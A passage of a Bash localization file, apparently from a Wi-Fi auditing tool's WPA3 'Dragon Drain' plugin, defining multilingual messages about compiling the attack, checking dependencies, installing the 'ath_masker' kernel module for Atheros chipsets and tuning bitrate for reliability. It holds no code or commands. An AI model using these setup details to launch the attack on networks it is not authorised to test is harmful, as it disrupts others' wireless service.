	arr["CATALAN","wpa3_dragon_drain_attack_6"]="Voleu veure la sortida de l'error que heu donat en actualitzar/instal·lar? \${blue_color}Potser així trobareu la causa principal del problema \${normal_color}\${visual_choice}"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_6"]="Deseja ver o erro ocorrido durante a atualização/instalação? \${blue_color}Talvez assim você possa encontrar a causa raiz do problema \${normal_color}\${visual_choice}"
	arr["RUSSIAN","wpa3_dragon_drain_attack_6"]="\${pending_of_translation} Вы хотите увидеть вывод выдающейся вами ошибки при обновлении/установке? \${blue_color}Возможно, таким образом Вам удастся установить причину проблемы \${normal_color}\${visual_choice}"
	arr["GREEK","wpa3_dragon_drain_attack_6"]="Θέλετε να δείτε το output του σφάλματος που προέκυψε κατά την ενημέρωση/εγκατάσταση; \${blue_color}Ίσως με αυτόν τον τρόπο να βρείτε τη βασική αιτία του προβλήματος \${normal_color}\${visual_choice}"
	arr["ITALIAN","wpa3_dragon_drain_attack_6"]="\${pending_of_translation} Vuoi vedere l'output dell'errore che si è verificato durante l'aggiornamento/installazione? \${blue_color}Forse in questo modo potresti scoprire la causa del problema \${normal_color}\${visual_choice}"
	arr["POLISH","wpa3_dragon_drain_attack_6"]="Wyświetlić szczegóły błędu aktualizacji/instalacji? \${blue_color}Może to pomóc zidentyfikować przyczynę \${normal_color}\${visual_choice}"
	arr["GERMAN","wpa3_dragon_drain_attack_6"]="Möchten Sie die Ausgabe des Fehlers sehen, der beim updaten/installieren aufgetreten ist? \${blue_color}Vielleicht finden Sie auf dieser Weise die Ursache des Fehlers \${normal_color}\${visual_choice}"
	arr["TURKISH","wpa3_dragon_drain_attack_6"]="\${pending_of_translation} Güncelleme/yükleme sırasında oluşan hatanın çıktısını görmek ister misiniz? \${blue_color}Belki bu şekilde sorununun temel nedenini bulabilirsiniz \${normal_color}\${visual_choice}"
	arr["ARABIC","wpa3_dragon_drain_attack_6"]="\${pending_of_translation} \${normal_color}\${visual_choice} \${blue_color}ربما بهذه الطريقة قد تجد السبب الاساسي للمشكلة \${green_color}هل تريد رؤية إخراج الخطأ الذي قدمته عند التحديث/التثبيت؟"
	arr["CHINESE","wpa3_dragon_drain_attack_6"]="您是否想查看更新/安装时给出的错误的输出？\${blue_color}也许可能发现问题的根本原因 \${normal_color}\${visual_choice}"

	arr["ENGLISH","wpa3_dragon_drain_attack_7"]="Dragon Drain has been compiled and installed successfully. It is now possible to proceed with launching the attack..."
	arr["SPANISH","wpa3_dragon_drain_attack_7"]="Se ha compilado e instalado exitosamente Dragon Drain. Ahora se puede continuar para lanzar el ataque..."
	arr["FRENCH","wpa3_dragon_drain_attack_7"]="\${pending_of_translation} Dragon Drain a été compilé et installé. Vous pouvez maintenant continuer à lancer l'attaque..."
	arr["CATALAN","wpa3_dragon_drain_attack_7"]="Dragon Drain s’ha compilat i instal·lat. Ara podeu continuar llançant l'atac..."
	arr["PORTUGUESE","wpa3_dragon_drain_attack_7"]="O Dragon Drain foi compilado e instalado. Agora você pode continuar com o ataque..."
	arr["RUSSIAN","wpa3_dragon_drain_attack_7"]="\${pending_of_translation} Дренаж дракона был скомпилирован и установлен. Теперь вы можете продолжать запускать атаку..."
	arr["GREEK","wpa3_dragon_drain_attack_7"]="Το Dragon Drain έγινε compile και εγκαταστάθηκε με επιτυχία. Είναι πλέον δυνατό να συνεχίσετε με την εκτέλεση της επίθεσης..."
	arr["ITALIAN","wpa3_dragon_drain_attack_7"]="\${pending_of_translation} Dragon Drain è stato compilato e installato. Ora puoi continuare a lanciare l'attacco..."
	arr["POLISH","wpa3_dragon_drain_attack_7"]="Dragon Drain został skompilowany i zainstalowany. Możesz teraz kontynuować atak..."
	arr["GERMAN","wpa3_dragon_drain_attack_7"]="Dragon Drain wurde kompiliert und installiert. Jetzt können Sie den Angriff weiter starten..."
	arr["TURKISH","wpa3_dragon_drain_attack_7"]="\${pending_of_translation} Dragon Drain derlendi ve kuruldu. Şimdi saldırıyı başlatmaya devam edebilirsiniz..."
	arr["ARABIC","wpa3_dragon_drain_attack_7"]="\${pending_of_translation} تم تجميع وتثبيت Dragon Drain. الآن يمكنك الاستمرار في شن الهجوم ..."
	arr["CHINESE","wpa3_dragon_drain_attack_7"]="Dragon Drain 二进制文件已编译且安装完成。现在您可以继续发动攻击..."

	arr["ENGLISH","wpa3_dragon_drain_attack_8"]="The necessary dependencies are installed"
	arr["SPANISH","wpa3_dragon_drain_attack_8"]="Las dependencias necesarias están instaladas"
	arr["FRENCH","wpa3_dragon_drain_attack_8"]="\${pending_of_translation} Les dépendances nécessaires sont installées"
	arr["CATALAN","wpa3_dragon_drain_attack_8"]="Les dependències necessàries estan instal·lades"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_8"]="As dependências necessárias estão instaladas"
	arr["RUSSIAN","wpa3_dragon_drain_attack_8"]="\${pending_of_translation} Необходимые зависимости установлены"
	arr["GREEK","wpa3_dragon_drain_attack_8"]="Τα απαραίτητα dependencies έχουν εγκατασταθεί"
	arr["ITALIAN","wpa3_dragon_drain_attack_8"]="\${pending_of_translation} Le dipendenze necessarie sono installate"
	arr["POLISH","wpa3_dragon_drain_attack_8"]="Niezbędne zależności są instalowane"
	arr["GERMAN","wpa3_dragon_drain_attack_8"]="Die notwendigen Abhängigkeiten sind installiert"
	arr["TURKISH","wpa3_dragon_drain_attack_8"]="\${pending_of_translation} Gerekli bağımlılıklar kuruldu"
	arr["ARABIC","wpa3_dragon_drain_attack_8"]="\${pending_of_translation} يتم تثبيت التبعيات اللازمة"
	arr["CHINESE","wpa3_dragon_drain_attack_8"]="必要的依赖已安装完成"

	arr["ENGLISH","wpa3_dragon_drain_attack_9"]="There has been some problem in the installation and compilation process. Please check the messages on the screen and solve the problem. The attack cannot be launched"
	arr["SPANISH","wpa3_dragon_drain_attack_9"]="Ha habido algún problema en el proceso de instalación y compilación. Por favor revisa los mensajes por pantalla y soluciona el problema. El ataque no se puede lanzar"
	arr["FRENCH","wpa3_dragon_drain_attack_9"]="\${pending_of_translation} Il y a eu un problème dans le processus d'installation et de compilation. Veuillez vérifier les messages à l'écran et résoudre le problème. L'attaque ne peut pas être lancée"
	arr["CATALAN","wpa3_dragon_drain_attack_9"]="Hi ha hagut algun problema en el procés d’instal·lació i recopilació. Comproveu els missatges de la pantalla i solucioneu el problema. L’atac no es pot llançar"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_9"]="Houve um problema no processo de instalação e compilação. Por favor, verifique as mensagens na tela e resolva o problema. O ataque não pode ser iniciado"
	arr["RUSSIAN","wpa3_dragon_drain_attack_9"]="\${pending_of_translation} Была некоторая проблема в процессе установки и компиляции. Пожалуйста, проверьте сообщения на экране и решите проблему. Атака не может быть запущена"
	arr["GREEK","wpa3_dragon_drain_attack_9"]="Παρουσιάστηκε πρόβλημα κατά τη διαδικασία εγκατάστασης και compile. Παρακαλώ ελέγξτε τα μηνύματα στην οθόνη και διορθώστε το πρόβλημα. Η επίθεση δεν μπορεί να ξεκινήσει"
	arr["ITALIAN","wpa3_dragon_drain_attack_9"]="\${pending_of_translation} C'è stato qualche problema nel processo di installazione e compilazione. Si prega di controllare i messaggi sullo schermo e risolvere il problema. L'attacco non può essere lanciato"
	arr["POLISH","wpa3_dragon_drain_attack_9"]="Proces instalacji i kompilacji napotkał trudności. Przeanalizuj wyświetlane komunikaty i usuń problem, aby umożliwić przeprowadzenie ataku"
	arr["GERMAN","wpa3_dragon_drain_attack_9"]="\${pending_of_translation} Das Installations- und Kompilierungsprozess gab es ein Problem. Bitte überprüfen Sie die Nachrichten auf dem Bildschirm und lösen Sie das Problem. Der Angriff kann nicht gestartet werden"
	arr["TURKISH","wpa3_dragon_drain_attack_9"]="\${pending_of_translation} Kurulum ve derleme sürecinde bazı sorunlar olmuştur. Lütfen ekrandaki mesajları kontrol edin ve sorunu çözün. Saldırı başlatılamaz"
	arr["ARABIC","wpa3_dragon_drain_attack_9"]="\${pending_of_translation} كانت هناك مشكلة في عملية التثبيت والتجميع. يرجى التحقق من الرسائل الموجودة على الشاشة وحل المشكلة. لا يمكن شن الهجوم"
	arr["CHINESE","wpa3_dragon_drain_attack_9"]="安装和编译过程中出现了问题。请检查屏幕上的错误信息并尝试解决。目前无法启动攻击"

	arr["ENGLISH","wpa3_dragon_drain_attack_10"]="Atheros chipset detected without \${normal_color}ath_masker\${yellow_color} module. It is needed for Atheros chipsets to make this attack to work properly. It will be installed"
	arr["SPANISH","wpa3_dragon_drain_attack_10"]="Chipset Atheros detectado sin el módulo \${normal_color}ath_masker\${yellow_color}. Es necesario tenerlo para que con los chips Atheros este ataque funcione correctamente. Será instalado"
	arr["FRENCH","wpa3_dragon_drain_attack_10"]="\${pending_of_translation} Chipset Atheros détecté sans module \${normal_color}ath_masker\${yellow_color}. Il est nécessaire que les chipsets d'Atheros fassent correctement fonctionner cette attaque. Il sera installé"
	arr["CATALAN","wpa3_dragon_drain_attack_10"]="Chipset Atheros detectat sense \${normal_color}ath_masker\${yellow_color} Mòdul. Cal que els chipsets Atheros facin que aquest atac funcioni correctament. S’instal·larà"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_10"]="Chipset Atheros detectado sem o módulo \${normal_color}ath_masker\${yellow_color}. Esse módulo é necessário para que chipsets Atheros executem este ataque corretamente. A instalação será realizada"
	arr["RUSSIAN","wpa3_dragon_drain_attack_10"]="\${pending_of_translation} Atheros Chipset обнаружен без модуля \${normal_color}ath_masker\${yellow_color}. Для чипсетов Atheros необходимо сделать эту атаку должным образом. Он будет установлен"
	arr["GREEK","wpa3_dragon_drain_attack_10"]="Το chipset Atheros ανιχνεύθηκε χωρίς το module \${normal_color}ath_masker\${yellow_color}. Είναι απαραίτητο για τα chipsets Atheros ώστε η επίθεση να λειτουργήσει σωστά. θα εγκατασταθεί"
	arr["ITALIAN","wpa3_dragon_drain_attack_10"]="\${pending_of_translation} Atheros Chipset rilevato senza modulo \${normal_color}ath_masker\${yellow_color}. È necessario affinché i chipset Atheros facciano funzionare questo attacco correttamente. Sarà installato"
	arr["POLISH","wpa3_dragon_drain_attack_10"]="Wykryto chipset Atheros bez modułu \${normal_color}ath_masker\${yellow_color}. Jest on wymagany do prawidłowego działania ataku na chipsetach Atheros. Zostanie teraz zainstalowany"
	arr["GERMAN","wpa3_dragon_drain_attack_10"]="Atheros-Chipset ohne \${normal_color}ath_masker\${yellow_color}-Modul. Es ist erforderlich, damit Atheros-Chipsets diesen Angriff richtig funktionieren. Es wird installiert"
	arr["TURKISH","wpa3_dragon_drain_attack_10"]="\${pending_of_translation} Atheros yonga seti \${normal_color}ath_masker\${yellow_color} modülü olmadan tespit edildi. Atheros yonga setlerinin bu saldırının düzgün çalışması için gereklidir. Kurulacak"
	arr["ARABIC","wpa3_dragon_drain_attack_10"]="\${pending_of_translation} تم اكتشاف شرائح أثيروس بدون وحدة \${normal_color}ath_masker\${yellow_color}. هناك حاجة لشرائح أثيروس لجعل هذا الهجوم يعمل بشكل صحيح. سيتم تثبيته"
	arr["CHINESE","wpa3_dragon_drain_attack_10"]="Atheros芯片组检测到缺少\${normal_color}ath_masker\${yellow_color}内核模块。模块即将安装"

	arr["ENGLISH","wpa3_dragon_drain_attack_11"]="\${normal_color}ath_masker\${blue_color} kernel module was installed successfully"
	arr["SPANISH","wpa3_dragon_drain_attack_11"]="El módulo de kernel \${normal_color}ath_masker\${blue_color} se ha instalado correctamente"
	arr["FRENCH","wpa3_dragon_drain_attack_11"]="\${pending_of_translation} Le module du kernel \${normal_color}ath_masker\${blue_color} a été installé avec succès"
	arr["CATALAN","wpa3_dragon_drain_attack_11"]="El mòdul del kernel \${normal_color}ath_masker\${blue_color} es va instal·lar amb èxit"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_11"]="O módulo \${normal_color}ath_masker\${blue_color} kernel foi instalado com sucesso"
	arr["RUSSIAN","wpa3_dragon_drain_attack_11"]="\${pending_of_translation} Модуль ядра \${normal_color}ath_masker\${blue_color} был успешно установлен"
	arr["GREEK","wpa3_dragon_drain_attack_11"]="Το kernel module \${normal_color}ath_masker\${blue_color} εγκαταστάθηκε με επιτυχία"
	arr["ITALIAN","wpa3_dragon_drain_attack_11"]="\${pending_of_translation} Il modulo kernel \${normal_color}ath_masker\${blue_color} è stato installato correttamente"
	arr["POLISH","wpa3_dragon_drain_attack_11"]="Moduł jądra \${normal_color}ath_masker\${blue_color} został pomyślnie zainstalowany"
	arr["GERMAN","wpa3_dragon_drain_attack_11"]="\${normal_color}ath_masker\${blue_color} Kernel-Modul wurde erfolgreich installiert"
	arr["TURKISH","wpa3_dragon_drain_attack_11"]="\${pending_of_translation} \${normal_color}ath_masker\${blue_color} çekirdek modülü başarıyla yüklendi"
	arr["ARABIC","wpa3_dragon_drain_attack_11"]="\${pending_of_translation} تم تثبيت وحدة \${normal_color}ath_masker\${blue_color} kernel بنجاح"
	arr["CHINESE","wpa3_dragon_drain_attack_11"]="\${normal_color}ath_masker\${blue_color}内核模块已成功安装"

	arr["ENGLISH","wpa3_dragon_drain_attack_12"]="There was a problem installing \${normal_color}ath_masker\${yellow_color} kernel module. The reliability of the attack could be affected. Be sure to install this manually (\${normal_color}\${ath_masker_repo}\${yellow_color}) as it is needed for Atheros chipsets"
	arr["SPANISH","wpa3_dragon_drain_attack_12"]="Hubo un problema instalando el módulo de kernel \${normal_color}ath_masker\${yellow_color}. La efectividad del ataque podría verse afectada. Asegúrate de instalar esto manualmente (\${normal_color}\${ath_masker_repo}\${yellow_color}) ya que es necesario para los chips de Atheros"
	arr["FRENCH","wpa3_dragon_drain_attack_12"]="\${pending_of_translation} Il y avait un problème à installer le module du noyau \${normal_color}ath_masker\${yellow_color}. La fiabilité de l'attaque pourrait être affectée. Assurez-vous de l'installer manuellement (\${normal_color}\${ath_masker_repo}\${yellow_color}) tel qu'il est nécessaire pour les chipsets Atheros"
	arr["CATALAN","wpa3_dragon_drain_attack_12"]="Hi va haver un problema per instal·lar el mòdul del kernel \${normal_color}ath_masker\${yellow_color}. La fiabilitat de l’atac es podria veure afectada. Assegureu-vos d’instal·lar-ho manualment (\${normal_color}\${ath_masker_repo}\${yellow_color}), ja que es necessita per a chipsets d’Atheros"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_12"]="Houve um problema ao instalar o módulo de kernel \${normal_color}ath_masker\${yellow_color}. A confiabilidade do ataque pode ser afetada. Certifique-se de instalá-lo manualmente (\${normal_color}\${ath_masker_repo}\${yellow_color}), pois ele é necessário para chipsets Atheros"
	arr["RUSSIAN","wpa3_dragon_drain_attack_12"]="\${pending_of_translation} Была проблема с установкой модуля ядра \${normal_color}ath_masker\${yellow_color}. На надежность атаки может быть затронута. Обязательно установите это вручную (\${normal_color}\${ath_masker_repo}\${yellow_color}), как это необходимо для чипсетов Atheros"
	arr["GREEK","wpa3_dragon_drain_attack_12"]="Παρουσιάστηκε πρόβλημα κατά την εγκατάσταση του kernel module \${normal_color}ath_masker\${yellow_color}. Η αξιοπιστία της επίθεσης μπορεί να επηρεαστεί. Βεβαιωθείτε ότι το εγκαθιστάτε χειροκίνητα (\${normal_color}\${ath_masker_repo}\${yellow_color}) καθώς είναι απαραίτητο για τα chipsets Atheros"
	arr["ITALIAN","wpa3_dragon_drain_attack_12"]="\${pending_of_translation} C'è stato un problema a installare il modulo kernel \${normal_color}ath_masker\${yellow_color}. L'affidabilità dell'attacco potrebbe essere influenzata. Assicurati di installarlo manualmente (\${normal_color}\${ath_masker_repo}\${yellow_color}) in quanto è necessario per i chipset Atheros"
	arr["POLISH","wpa3_dragon_drain_attack_12"]="Wystąpił problem z instalacją modułu \${normal_color}ath_masker\${yellow_color}. Może to wpłynąć na skuteczność ataku. Pamiętaj, aby zainstalować ręcznie (\${normal_color}\${ath_masker_repo}\${yellow_color}), potrzebny do chipsetów Atheros"
	arr["GERMAN","wpa3_dragon_drain_attack_12"]="Bei der Installation des Kernelmoduls \${normal_color}ath_masker\${yellow_color} ist ein Problem aufgetreten. Die Effektivität des Angriffs kann dadurch beeinträchtigt werden. Installieren Sie es unbedingt manuell (\${normal_color}\${ath_masker_repo}\${yellow_color}), da es für Atheros-Chips erforderlich ist"
	arr["TURKISH","wpa3_dragon_drain_attack_12"]="\${pending_of_translation} \${normal_color}ath_masker\${yellow_color} çekirdek modülünü kurarken bir sorun vardı. Saldırının güvenilirliği etkilenebilir. Bunu manuel olarak (\${normal_color}\${ath_masker_repo}\${yellow_color}) Atheros yonga setleri için gerekli olduğu için yüklediğinizden emin olun"
	arr["ARABIC","wpa3_dragon_drain_attack_12"]="\${pending_of_translation} كانت هناك مشكلة في تثبيت \${normal_color}ath_masker\${yellow_color} kernel module. يمكن أن تتأثر موثوقية الهجوم. تأكد من تثبيت هذا يدويًا (\${normal_color}\${ath_masker_repo}\${yellow_color}) كما هو مطلوب لشرائح Atheros"
	arr["CHINESE","wpa3_dragon_drain_attack_12"]="安装 \${normal_color}ath_masker\${yellow_color} 内核模块存在问题。攻击的可靠性可能会受到影响。请务必手动安装（\${normal_color}\${ath_masker_repo}\${yellow_color}）它Atheros芯片组所必须的"

	arr["ENGLISH","wpa3_dragon_drain_attack_13"]="Atheros chipset has been detected and the kernel module \${normal_color}ath_masker\${blue_color} is also installed"
	arr["SPANISH","wpa3_dragon_drain_attack_13"]="Se ha detectado chipset Atheros y además está instalado el módulo de kernel \${normal_color}ath_masker\${blue_color}"
	arr["FRENCH","wpa3_dragon_drain_attack_13"]="\${pending_of_translation} Le chipset Atheros a été détecté et le module du kernel \${normal_color}ath_masker\${blue_color} est également installé"
	arr["CATALAN","wpa3_dragon_drain_attack_13"]="S'ha detectat chipset Atheros i a més el mòdul del kernel \${normal_color}ath_masker\${blue_color} també està instal·lat"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_13"]="O chipset Atheros foi detectado e o módulo do kernel \${normal_color}ath_masker\${blue_color} também está instalado"
	arr["RUSSIAN","wpa3_dragon_drain_attack_13"]="\${pending_of_translation} Чипсет Atheros был обнаружен, и модуль ядра \${normal_color}ath_masker\${blue_color} также установлен"
	arr["GREEK","wpa3_dragon_drain_attack_13"]="Ανιχνεύθηκε chipset Atheros και το kernel module \${normal_color}ath_masker\${blue_color} είναι επίσης εγκατεστημένο"
	arr["ITALIAN","wpa3_dragon_drain_attack_13"]="\${pending_of_translation} È stato rilevato il chipset Atheros e il modulo kernel \${normal_color}ath_masker\${blue_color} è anche installato"
	arr["POLISH","wpa3_dragon_drain_attack_13"]="Chipset Atheros i zainstalowany moduł jądra \${normal_color}ath_masker\${blue_color} zostały wykryte"
	arr["GERMAN","wpa3_dragon_drain_attack_13"]="Der Atheros-Chipsatz wurde erkannt und das Kernel-Modul \${normal_color}ath_masker\${blue_color} ist ebenfalls installiert"
	arr["TURKISH","wpa3_dragon_drain_attack_13"]="\${pending_of_translation} Atheros yonga seti tespit edildi ve çekirdek modülü \${normal_color}ath_masker\${blue_color} da yüklendi"
	arr["ARABIC","wpa3_dragon_drain_attack_13"]="\${pending_of_translation} تم اكتشاف شرائح Atheros وتم تثبيت وحدة kernel \${normal_color}ath_masker\${blue_color}"
	arr["CHINESE","wpa3_dragon_drain_attack_13"]="已经检测到Atheros芯片组，已经检测到 \${normal_color}ath_masker\${blue_color} 内核模块"

	arr["ENGLISH","wpa3_dragon_drain_attack_14"]="Needed dependencies now will be checked"
	arr["SPANISH","wpa3_dragon_drain_attack_14"]="Ahora se van a chequear las dependencias necesarias"
	arr["FRENCH","wpa3_dragon_drain_attack_14"]="\${pending_of_translation} Les dépendances nécessaires seront maintenant vérifiées"
	arr["CATALAN","wpa3_dragon_drain_attack_14"]="Ara es comprovaran les dependències necessàries"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_14"]="As dependências necessárias serão verificadas"
	arr["RUSSIAN","wpa3_dragon_drain_attack_14"]="\${pending_of_translation} Необходимые зависимости сейчас будут проверены"
	arr["GREEK","wpa3_dragon_drain_attack_14"]="Θα γίνει τώρα έλεγχος των απαραίτητων dependencies"
	arr["ITALIAN","wpa3_dragon_drain_attack_14"]="\${pending_of_translation} Le dipendenze necessarie ora verranno controllate"
	arr["POLISH","wpa3_dragon_drain_attack_14"]="Wymagane zależności zostaną teraz sprawdzone"
	arr["GERMAN","wpa3_dragon_drain_attack_14"]="Die benötigten Abhängigkeiten werden jetzt überprüft"
	arr["TURKISH","wpa3_dragon_drain_attack_14"]="\${pending_of_translation} Gerekli bağımlılıklar şimdi kontrol edilecek"
	arr["ARABIC","wpa3_dragon_drain_attack_14"]="\${pending_of_translation} سيتم الآن التحقق من التبعيات المطلوبة"
	arr["CHINESE","wpa3_dragon_drain_attack_14"]="现在将检查所需的依赖项"

	arr["ENGLISH","wpa3_dragon_drain_attack_15"]="Chipset Atheros detected, but you don't have the kernel module \${normal_color}ath_masker\${yellow_color} installed. To install it, kernel headers are needed, and the plugin has not been able to determine the name of the package that is needed to be able to install it. The reliability of the attack could be affected. Be sure to install this manually (\${normal_color}\${ath_masker_repo}\${yellow_color}) as it is needed for Atheros chipsets"
	arr["SPANISH","wpa3_dragon_drain_attack_15"]="Chipset Atheros detectado, pero no tienes el módulo de kernel \${normal_color}ath_masker\${yellow_color} instalado. Para instalarlo hacen falta los headers del kernel, y el plugin no ha sido capaz de determinar el nombre del paquete que hace falta para poder instalarlo. La efectividad del ataque podría verse afectada. Asegúrate de instalar esto manualmente (\${normal_color}\${ath_masker_repo}\${yellow_color}) ya que es necesario para los chips de Atheros"
	arr["FRENCH","wpa3_dragon_drain_attack_15"]="\${pending_of_translation} Chipset Atheros détecté, mais vous n'avez pas le module du noyau \${normal_color}ath_masker\${yellow_color} installé. Pour l'installer, des en-têtes de noyau sont nécessaires et le plugin n'a pas été en mesure de déterminer le nom du package nécessaire pour pouvoir l'installer. L'efficacité de l'attaque pourrait être affectée. Assurez-vous de l'installer manuellement (\${normal_color}\${ath_masker_repo}\${yellow_color}) car il est nécessaire pour les puces Atheros"
	arr["CATALAN","wpa3_dragon_drain_attack_15"]="Chipset Atheros detectat, però no teniu instal·lat el mòdul del kernel \${normal_color}ath_masker\${yellow_color}. Per instal·lar-lo, calen capçaleres del kernel i el complement no ha pogut determinar el nom del paquet que es necessita per poder instal·lar-lo. L’efectivitat de l’atac es podria veure afectada. Assegureu-vos d’instal·lar-ho manualment (\${normal_color}\${ath_masker_repo}\${yellow_color}), ja que és necessari per als xips Atheros"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_15"]="Chipset Atheros detectado, mas você não tem o módulo do kernel \${normal_color}ath_masker\${yellow_color} instalado. Para instalá-lo, os headers do kernel são necessários, e o plugin não conseguiu determinar o nome do pacote necessário para a instalação. A confiabilidade do ataque pode ser afetada. Certifique-se de instalá-lo manualmente (\${normal_color}\${ath_masker_repo}\${yellow_color}), pois é necessário para chipsets Atheros"
	arr["RUSSIAN","wpa3_dragon_drain_attack_15"]="\${pending_of_translation} Обнаружено chipset Atheros, но у вас нет модуля ядра \${normal_color}ath_masker\${yellow_color}. Чтобы установить его, необходимы заголовки ядра, и плагин не смог определить название пакета, необходимого для его установки. Эффективность атаки может быть затронута. Обязательно установите это вручную (\${normal_color}\${ath_masker_repo}\${yellow_color}), поскольку это необходимо для чипсов Atheros"
	arr["GREEK","wpa3_dragon_drain_attack_15"]="Ανιχνεύθηκε chipset Atheros, αλλά δεν έχετε εγκατεστημένο το kernel module \${normal_color}ath_masker\${yellow_color}. Για την εγκατάστασή του απαιτούνται τα kernel headers, και το plugin δεν μπόρεσε να προσδιορίσει το όνομα του πακέτου που απαιτείται. Η αξιοπιστία της επίθεσης μπορεί να επηρεαστεί. Βεβαιωθείτε ότι εγκαθιστάτε χειροκίνητα το (\${normal_color}\${ath_masker_repo}\${yellow_color}) καθώς είναι απαραίτητο για τα chipsets Atheros"
	arr["ITALIAN","wpa3_dragon_drain_attack_15"]="\${pending_of_translation} Chipset Atheros rilevato, ma non hai il modulo del kernel \${normal_color}ath_masker\${yellow_color} installato. Per installarlo, sono necessarie testate per kernel e il plug -in non è stato in grado di determinare il nome del pacchetto che è necessario per poterlo installarlo. L'efficacia dell'attacco potrebbe essere influenzata. Assicurati di installare questo manualmente (\${normal_color}\${ath_masker_repo}\${yellow_color}) poiché è necessario per Atheros chipsets"
	arr["POLISH","wpa3_dragon_drain_attack_15"]="Wykryto chipset Atheros, ale brak modułu \${normal_color}ath_masker\${yellow_color} (wymagane nagłówki jądra). Nie można zidentyfikować potrzebnego pakietu. Ręczna instalacja (\${normal_color}\${ath_masker_repo}\${yellow_color}) wymagana dla poprawnego działania ataku"
	arr["GERMAN","wpa3_dragon_drain_attack_15"]="Chipsatz-Atheros erkannt, aber Sie haben das Kernel-Modul \${normal_color}ath_masker\${yellow_color} nicht installiert. Um es zu installieren, sind Kernel-Header benötigt, und das Plugin konnte den Namen des Pakets nicht bestimmen, das benötigt wird, um es zu installieren. Die Effektivität des Angriffs kann dadurch beeinträchtigt werden. Installieren Sie es manuell unbedingt (\${normal_color}\${ath_masker_repo}\${yellow_color}), da es für Atheros-Chipsets erforderlich ist"
	arr["TURKISH","wpa3_dragon_drain_attack_15"]="\${pending_of_translation} Yonga seti Atheros tespit edildi, ancak çekirdek modülü \${normal_color}ath_masker\${yellow_color} yüklü. Yüklemek için çekirdek başlıklarına ihtiyaç vardır ve eklenti, yükleyebilmesi için gereken paketin adını belirleyememiştir. Saldırının etkinliği etkilenebilir. Bunu manuel olarak (\${normal_color}\${ath_masker_repo}\${yellow_color}) yüklediğinizden emin olun, çünkü Atheros çipleri için gereklidir"
	arr["ARABIC","wpa3_dragon_drain_attack_15"]="\${pending_of_translation} تم اكتشاف شرائح Atheros ، ولكن ليس لديك وحدة kernel \${normal_color}ath_masker\${yellow_color} المثبتة. لتثبيته ، هناك حاجة إلى رؤوس kernel ، ولم يتمكن المكون الإضافي من تحديد اسم الحزمة اللازمة لتكون قادرة على تثبيتها. يمكن أن تتأثر فعالية الهجوم. تأكد من تثبيت هذا يدويًا (\${normal_color}\${ath_masker_repo}\${yellow_color}) لأنه ضروري لشرائح Atheros"
	arr["CHINESE","wpa3_dragon_drain_attack_15"]="检测到Atheros芯片组，但是您还没有安装内核模块\${normal_color}ath_masker\${yellow_color}。要安装它，需要先安装内核头文件，并且该插件可能无法确定它所需的软件包的名称。请务必手动完成安装操作（\${normal_color}\${ath_masker_repo}\${yellow_color}）是Atheros芯片组所必须的"

	arr["ENGLISH","wpa3_dragon_drain_attack_16"]="No need to check dependencies. They were checked previously"
	arr["SPANISH","wpa3_dragon_drain_attack_16"]="No hay necesidad de verificar las dependencias. Ya fueron revisadas anteriormente"
	arr["FRENCH","wpa3_dragon_drain_attack_16"]="\${pending_of_translation} Pas besoin de vérifier les dépendances. Ils ont été vérifiés précédemment"
	arr["CATALAN","wpa3_dragon_drain_attack_16"]="No cal comprovar les dependències. Es van comprovar anteriorment"
	arr["PORTUGUESE","wpa3_dragon_drain_attack_16"]="Não é necessário verificar as dependências. Elas já foram verificadas anteriormente"
	arr["RUSSIAN","wpa3_dragon_drain_attack_16"]="\${pending_of_translation} Не нужно проверять зависимости. Они были проверены ранее"
	arr["GREEK","wpa3_dragon_drain_attack_16"]="Δεν χρειάζεται έλεγχος των dependencies. Ελέγχτηκαν προηγουμένως"
	arr["ITALIAN","wpa3_dragon_drain_attack_16"]="\${pending_of_translation} Non c'è bisogno di controllare le dipendenze. Sono stati controllati in precedenza"
	arr["POLISH","wpa3_dragon_drain_attack_16"]="Nie trzeba sprawdzać zależności. Były wcześniej sprawdzone"
	arr["GERMAN","wpa3_dragon_drain_attack_16"]="Keine Notwendigkeit, Abhängigkeiten zu überprüfen. Sie wurden zuvor überprüft"
	arr["TURKISH","wpa3_dragon_drain_attack_16"]="\${pending_of_translation} Bağımlılıkları kontrol etmeye gerek yok. Daha önce kontrol edildi"
	arr["ARABIC","wpa3_dragon_drain_attack_16"]="\${pending_of_translation} لا حاجة للتحقق من التبعيات. تم فحصهم من قبل"
	arr["CHINESE","wpa3_dragon_drain_attack_16"]="已经完成依赖项检查，无需再次检查。"

	arr["ENGLISH","wpa3_dragon_drain_attack_17"]="Bitrate adjustment supported by your chipset. Adjusting it to improve reliability..."
	arr["SPANISH","wpa3_dragon_drain_attack_17"]="Ajuste de bitrate compatible con tu chipset. Ajustando para mejorar el rendimiento..."
	arr["FRENCH","wpa3_dragon_drain_attack_17"]="\${pending_of_translation} Réglage du bitrate pris en charge par votre chipset. L'ajuster pour améliorer la fiabilité..."
	arr["CATALAN","wpa3_dragon_drain_attack_17"]="Ajust de bitrate suportat pel teu chipset. Ajustant-lo per millorar la fiabilitat..."
	arr["PORTUGUESE","wpa3_dragon_drain_attack_17"]="Ajuste de bitrate suportado pelo seu chipset. Ajustando para melhorar a confiabilidade..."
	arr["RUSSIAN","wpa3_dragon_drain_attack_17"]="\${pending_of_translation} Регулировка bitrate поддерживается вашим чипсетом. Регулирование его для повышения надежности..."
	arr["GREEK","wpa3_dragon_drain_attack_17"]="Υποστηρίζεται προσαρμογή bitrate από το chipset σας. Γίνεται προσαρμογή για βελτίωση της αξιοπιστίας..."
	arr["ITALIAN","wpa3_dragon_drain_attack_17"]="\${pending_of_translation} Regolazione bitrate supportata dal tuo chipset. Regolandolo per migliorare l'affidabilità..."
	arr["POLISH","wpa3_dragon_drain_attack_17"]="Wykryto obsługę zmiany bitrate przez chipset. Automatyczna korekta w celu poprawy stabilności..."
	arr["GERMAN","wpa3_dragon_drain_attack_17"]="Die von Ihrem Chipsatz unterstützte bitrate-Einstellung. Anpassen, um die Zuverlässigkeit zu verbessern..."
